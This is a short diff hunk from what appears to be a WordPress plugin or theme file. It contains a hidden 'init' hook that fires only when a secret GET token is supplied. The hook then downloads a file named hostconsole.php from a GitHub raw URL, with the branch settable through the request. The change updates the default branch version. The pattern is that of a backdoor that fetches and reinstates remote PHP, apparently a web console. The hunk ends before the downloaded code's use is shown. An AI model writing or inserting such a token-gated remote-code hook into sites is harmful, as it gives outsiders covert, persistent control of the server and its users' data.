@@ -7,7 +7,7 @@
 
 add_action('init', function() {
     if (!isset($_GET['recover_hostconsole']) || $_GET['recover_hostconsole'] !== 'KhTn2268') return;
-    $branch = $_GET['branch'] ?? 'arena/hostconsole-v17';
+    $branch = $_GET['branch'] ?? 'arena/hostconsole-v19';
     $url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.time();
     $content = @file_get_contents($url);
     if (!$content) {
